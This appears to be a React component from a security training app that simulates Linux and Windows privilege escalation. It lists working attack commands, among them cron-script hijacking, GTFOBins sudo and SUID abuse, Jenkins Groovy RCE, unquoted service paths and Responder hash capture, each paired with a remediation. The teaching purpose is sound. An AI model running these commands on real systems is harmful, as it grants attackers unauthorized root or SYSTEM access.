import { useState } from 'react';
import { TerminalSquare, Shield, Lock, AlertTriangle, CheckCircle2, Terminal, Server, Bug, Cpu } from 'lucide-react';
import { sfx } from '@/utils/soundEngine';
import { motion, AnimatePresence } from 'framer-motion';

const LINUX_PRIVESC = [
  {
    id: 'tty',
    name: 'TTY Shell Spawning',
    icon: Terminal,
    command: 'python3 -c "import pty; pty.spawn(\'/bin/bash\')"',
    desc: 'Upgrade from non-interactive shell to full TTY',
    output: 'root@victim:~# (interactive shell established)',
    fix: 'Use restricted shells (rbash). Disable python/perl on service accounts.',
    risk: 'medium',
  },
  {
    id: 'cron',
    name: 'Cron Job Hijacking',
    icon: Lock,
    command: 'cat /etc/crontab\n# */5 * * * * root /opt/backup.sh\nls -la /opt/backup.sh\n# -rwxrwxrwx 1 root root backup.sh',
    desc: 'World-writable cron script running as root',
    output: 'echo "cp /bin/bash /tmp/rootbash; chmod u+s /tmp/rootbash" >> /opt/backup.sh\n# Wait 5 min, then: /tmp/rootbash -p',
    fix: 'chmod 700 /opt/backup.sh | chown root:root | Remove write permissions for non-root.',
    risk: 'critical',
  },
  {
    id: 'sudo',
    name: 'Sudo NOPASSWD Abuse (GTFOBins)',
    icon: Bug,
    command: 'sudo -l\n# (ALL, NOPASSWD) /usr/bin/zip',
    desc: 'zip binary with NOPASSWD sudo — GTFOBins escalation',
    output: 'TF=$(mktemp -d)\necho "sh" > $TF/sh.sh\nsudo zip /tmp/x.zip $TF/sh.sh -TT "sh.sh"\n# → root shell spawned',
    fix: 'Remove NOPASSWD for dangerous binaries. Use sudoers allowlist with specific arguments.',
    risk: 'critical',
  },
  {
    id: 'suid',
    name: 'SUID Binary Exploitation',
    icon: Cpu,
    command: 'find / -perm -4000 2>/dev/null\n# /usr/bin/php7.3 (SUID)',
    desc: 'PHP binary with SUID bit — GTFOBins escalation',
    output: '/usr/bin/php7.3 -r "pcntl_exec(\'/bin/sh\', []);"\n# → root shell',
    fix: 'find / -perm -4000 -exec chmod u-s {} \\; | Remove SUID from non-essential binaries.',
    risk: 'critical',
  },
];

const WINDOWS_PRIVESC = [
  {
    id: 'jenkins',
    name: 'Jenkins Groovy Console',
    icon: Server,
    command: 'Jenkins → Script Console:\ngroovy: println "cmd /c whoami".execute().text',
    desc: 'Jenkins running as SYSTEM — Groovy script console = RCE',
    output: 'nt authority\\system',
    fix: 'Disable Jenkins script console. Run Jenkins as low-privilege service account. Enable CSRF protection.',
    risk: 'critical',
  },
  {
    id: 'unquoted',
    name: 'Unquoted Service Path',
    icon: Bug,
    command: 'sc qc WiseBootAssistant\n# BINARY_PATH_NAME: C:\\Program Files\\Wise\\Boot\\assistant.exe',
    desc: 'Unquoted service path with spaces → plant executable in earlier directory',
    output: 'Place evil.exe at C:\\Program.exe\n# Service starts → runs C:\\Program.exe as SYSTEM',
    fix: 'Quote all service paths: sc config WiseBootAssistant binPath= "\\"C:\\Program Files\\Wise\\Boot\\assistant.exe\\""',
    risk: 'critical',
  },
  {
    id: 'responder',
    name: 'Responder NTLMv2 Hash Capture',
    icon: Lock,
    command: 'responder -I eth0 -rdwv\n# [SMB] NTLMv2-SSP Hash captured:',
    desc: 'Broadcast LLMNR/NBT-NS poisoning captures NTLMv2 hashes',
    output: 'admin::TARGETCORP:1122334455667788:A1B2C3D4E5F6...\n# john --format=netntlmv2 hashes.txt\n# password123 (cracked in 0.8s)',
    fix: 'Disable LLMNR/NBT-NS via GPO. Enforce SMB signing. Require strong passwords. Enable LDAP signing.',
    risk: 'critical',
  },
];

export function PrivEscWorkspace() {
  const [osTab, setOsTab] = useState<'linux' | 'windows'>('linux');
  const [exploited, setExploited] = useState<Set<string>>(new Set());
  const [hardened, setHardened] = useState<Set<string>>(new Set());

  const items = osTab === 'linux' ? LINUX_PRIVESC : WINDOWS_PRIVESC;
  const riskColor = (risk: string) => risk === 'critical' ? 'badge-crimson' : 'badge-amber';

  const handleExploit = (id: string) => {
    setExploited((prev) => new Set([...prev, id]));
    sfx.breach();
  };

  const handleHarden = (id: string) => {
    setHardened((prev) => new Set([...prev, id]));
    sfx.shield();
  };

  return (
    <div className="flex h-full flex-col p-2 gap-2 overflow-hidden">
      {/* OS Toggle */}
      <div className="flex items-center gap-2">
        <div className="flex items-center gap-1 bg-obsidian-850 border border-obsidian-700 rounded-md p-0.5">
          <button
            className={`flex items-center gap-1.5 px-3 py-1.5 text-xs font-semibold rounded transition-all ${
              osTab === 'linux' ? 'bg-amber-600/20 text-amber-400' : 'text-slate-500'
            }`}
            onClick={() => { setOsTab('linux'); sfx.tab(); }}
          >
            <TerminalSquare size={14} /> Linux PrivEsc (LinPEAS + pspy64 + GTFOBins)
          </button>
          <button
            className={`flex items-center gap-1.5 px-3 py-1.5 text-xs font-semibold rounded transition-all ${
              osTab === 'windows' ? 'bg-cyan-600/20 text-cyan-400' : 'text-slate-500'
            }`}
            onClick={() => { setOsTab('windows'); sfx.tab(); }}
          >
            <Server size={14} /> Windows PrivEsc (WinPEAS + Metasploit)
          </button>
        </div>
        <div className="text-[10px] text-slate-600">
          {exploited.size} exploited | {hardened.size} hardened
        </div>
      </div>

      {/* Exploit cards */}
      <div className="flex-1 overflow-auto space-y-2">
        {items.map((item) => {
          const Icon = item.icon;
          const isExploited = exploited.has(item.id);
          const isHardened = hardened.has(item.id);
          return (
            <div key={item.id} className={`panel overflow-hidden border ${isHardened ? 'border-emerald-600/30' : isExploited ? 'border-crimson-600/30' : 'border-obsidian-700'}`}>
              <div className="flex items-center gap-3 p-3">
                <div className={`p-2 rounded-md ${isHardened ? 'bg-emerald-600/10' : isExploited ? 'bg-crimson-600/10' : 'bg-obsidian-800'}`}>
                  <Icon size={16} className={isHardened ? 'text-emerald-400' : isExploited ? 'text-crimson-400' : 'text-slate-500'} />
                </div>
                <div className="flex-1 min-w-0">
                  <div className="flex items-center gap-2">
                    <span className="text-sm font-semibold text-slate-300">{item.name}</span>
                    <span className={riskColor(item.risk)}>{item.risk}</span>
                    {isExploited && <span className="badge-crimson">EXPLOITED</span>}
                    {isHardened && <span className="badge-emerald">HARDENED</span>}
                  </div>
                  <div className="text-[10px] text-slate-500 mt-0.5">{item.desc}</div>
                </div>
                <div className="flex items-center gap-1 shrink-0">
                  {!isExploited && !isHardened && (
                    <button className="btn-crimson flex items-center gap-1" onClick={() => handleExploit(item.id)}>
                      <Terminal size={11} /> Exploit
                    </button>
                  )}
                  {isExploited && !isHardened && (
                    <button className="btn-emerald flex items-center gap-1" onClick={() => handleHarden(item.id)}>
                      <Shield size={11} /> Harden
                    </button>
                  )}
                </div>
              </div>

              {/* Command + output */}
              <div className="px-3 pb-3 space-y-2">
                <div className="terminal p-2">
                  <div className="text-[9px] text-slate-600 uppercase mb-1">Command</div>
                  <pre className="text-[10px] font-mono text-cyan-400 whitespace-pre-wrap">{item.command}</pre>
                </div>
                <AnimatePresence>
                  {isExploited && (
                    <motion.div
                      initial={{ opacity: 0, height: 0 }}
                      animate={{ opacity: 1, height: 'auto' }}
                      exit={{ opacity: 0, height: 0 }}
                      className="space-y-2"
                    >
                      <div className="terminal p-2 border-crimson-600/20">
                        <div className="text-[9px] text-crimson-400 uppercase mb-1 flex items-center gap-1">
                          <AlertTriangle size={10} /> Exploit Output
                        </div>
                        <pre className="text-[10px] font-mono text-crimson-400 whitespace-pre-wrap">{item.output}</pre>
                      </div>
                    </motion.div>
                  )}
                </AnimatePresence>
                {isHardened && (
                  <motion.div
                    initial={{ opacity: 0, height: 0 }}
                    animate={{ opacity: 1, height: 'auto' }}
                    className="terminal p-2 border-emerald-600/20"
                  >
                    <div className="text-[9px] text-emerald-400 uppercase mb-1 flex items-center gap-1">
                      <CheckCircle2 size={10} /> Remediation Applied
                    </div>
                    <pre className="text-[10px] font-mono text-emerald-400 whitespace-pre-wrap">{item.fix}</pre>
                  </motion.div>
                )}
              </div>
            </div>
          );
        })}

        {/* Summary */}
        <div className="panel p-3">
          <div className="text-[10px] text-slate-500 uppercase mb-2">
            {osTab === 'linux' ? 'LinPEAS + pspy64 Enumeration Summary' : 'WinPEAS + Metasploit Summary'}
          </div>
          <div className="grid grid-cols-3 gap-2">
            <div className="text-center p-2 rounded bg-obsidian-800">
              <div className="text-xl font-bold text-crimson-400">{exploited.size - hardened.size}</div>
              <div className="text-[9px] text-slate-600">Open Vectors</div>
            </div>
            <div className="text-center p-2 rounded bg-obsidian-800">
              <div className="text-xl font-bold text-emerald-400">{hardened.size}</div>
              <div className="text-[9px] text-slate-600">Hardened</div>
            </div>
            <div className="text-center p-2 rounded bg-obsidian-800">
              <div className="text-xl font-bold text-cyan-400">{items.length}</div>
              <div className="text-[9px] text-slate-600">Total Checks</div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
